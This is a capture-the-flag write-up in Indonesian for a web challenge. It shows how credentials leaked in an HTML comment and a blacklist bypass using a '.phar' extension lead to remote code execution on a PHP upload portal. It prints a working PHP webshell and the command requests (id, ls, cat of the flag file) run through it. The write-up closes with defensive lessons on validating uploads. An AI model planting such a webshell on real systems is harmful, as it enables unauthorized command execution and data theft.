---
title: "W1-C3 Upload Dokumen"
author: azizul-manal-gaumalanga
tags: [web, zero-day-2026]
image: images/oxucl-logo.jpg
---

## Detail Soal

| Field | Value |
|-------|-------|
| Nama Challenge | W1-C3: Upload Dokumen |
| Kategori | Web Breach |
| Event | ZERO DAY Mini Games 2026 |

## Deskripsi Singkat

Challenge **W1-C3: Upload Dokumen** merupakan challenge Web Breach yang membahas celah pada fitur upload file. Website menyediakan portal upload dokumen internal milik PT Infranet Solusi. Berdasarkan narasi dan catatan challenge, fokus utama penyelesaian adalah mencari kelemahan pada kebijakan validasi file upload.

## Analisis Awal

Saat pertama kali membuka website, ditemukan halaman login pegawai. Setelah melihat source code halaman, terdapat komentar HTML yang berisi kredensial login.

```html
<!-- Akses portal pegawai: pegawai / BerkasUji2026 -->
```

Dari komentar tersebut, saya mendapatkan username dan password berikut.

```text
Username: pegawai
Password: BerkasUji2026
```

Setelah berhasil login, saya diarahkan ke halaman **Sistem Upload Dokumen Internal**. Pada halaman tersebut terdapat fitur upload file dengan keterangan bahwa sistem menerima file dokumen standar seperti PDF, DOCX, XLS, TXT, CSV, JPG, dan PNG.

```text
Sistem ini menerima dokumen kerja standar: PDF, DOCX, XLS, TXT, CSV, JPG, dan PNG.
```

Catatan challenge juga memberikan petunjuk berikut.

```text
"Daftar larangan yang tidak lengkap sama bahayanya dengan tidak ada daftar larangan sama sekali."
```

Petunjuk tersebut mengarah pada kemungkinan bahwa sistem menggunakan blacklist extension. Jika daftar ekstensi yang diblokir tidak lengkap, maka ekstensi lain yang masih dapat diproses sebagai PHP bisa digunakan untuk bypass upload.

## Langkah Penyelesaian

Langkah pertama adalah login menggunakan kredensial yang ditemukan pada komentar HTML.

```text
pegawai / BerkasUji2026
```

Setelah masuk ke halaman upload, saya membuat file webshell PHP sederhana dengan nama:

```text
a.phar
```

Isi payload yang digunakan adalah sebagai berikut.

```php
<?php
echo "OK<br>";
if (isset($_GET["cmd"])) {
    echo "<pre>";
    system($_GET["cmd"]);
    echo "</pre>";
}
?>
```

Ekstensi `.phar` digunakan karena pada beberapa konfigurasi server PHP, file dengan ekstensi tersebut masih dapat dieksekusi sebagai script PHP. Selain itu, ekstensi `.phar` tidak termasuk dalam daftar ekstensi yang diblokir oleh sistem, sehingga file berhasil diunggah.

Setelah upload berhasil, file dapat diakses melalui direktori upload.

```text
/uploads/a.phar
```

Saat file dibuka, halaman menampilkan output:

```text
OK
```

Hal ini menunjukkan bahwa file berhasil diakses dan script PHP di dalamnya berjalan.

Selanjutnya, saya menguji eksekusi command menggunakan parameter `cmd`.

```text
/uploads/a.phar?cmd=id
```

Hasilnya menunjukkan bahwa command berhasil dijalankan oleh server.

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Output tersebut membuktikan bahwa celah upload berhasil dimanfaatkan menjadi Remote Code Execution dengan user `www-data`.

Setelah itu, saya melakukan enumerasi direktori root menggunakan command berikut.

```text
/uploads/a.phar?cmd=ls -la /
```

Dari hasil listing, ditemukan bahwa server berjalan di dalam container dan terdapat direktori `/var/www`.

Kemudian saya mengecek isi direktori `/var/www`.

```text
/uploads/a.phar?cmd=ls -la /var/www
```

Hasilnya menunjukkan adanya dua direktori penting.

```text
html
private
```

Direktori `html` digunakan sebagai webroot, sedangkan direktori `private` mencurigakan karena berada di luar webroot dan biasanya digunakan untuk menyimpan file sensitif.

Saya kemudian mengecek isi direktori `/var/www/private`.

```text
/uploads/a.phar?cmd=ls -la /var/www/private 2>&1
```

Hasilnya ditemukan file flag.

```text
-rw-r----- 1 root www-data 29 Jun 2 04:17 flag.txt
```

Permission file tersebut menunjukkan bahwa file dimiliki oleh user `root`, tetapi group-nya adalah `www-data`. Karena webshell berjalan sebagai `www-data`, file tersebut tetap dapat dibaca.

Langkah terakhir adalah membaca isi file flag.

```text
/uploads/a.phar?cmd=cat /var/www/private/flag.txt
```

Dari command tersebut, flag berhasil didapatkan.

## Flag

```text
flag{ph4r_upl04d_byp4ss_rce}
```

## Kesimpulan / Hal yang Dipelajari

Challenge ini menunjukkan bahwa validasi upload file menggunakan blacklist tidak aman jika daftar ekstensi yang diblokir tidak lengkap. Meskipun ekstensi umum seperti `.php` atau `.phtml` dapat diblokir, ekstensi lain seperti `.phar` masih dapat dimanfaatkan apabila server tetap mengeksekusinya sebagai script PHP.

Dari challenge ini, saya belajar bahwa fitur upload file harus divalidasi menggunakan whitelist yang ketat, bukan hanya blacklist. Selain itu, server juga sebaiknya tidak mengizinkan eksekusi script di direktori upload, melakukan pengecekan MIME type dan isi file, mengganti nama file saat disimpan, serta menyimpan file upload di lokasi yang aman.
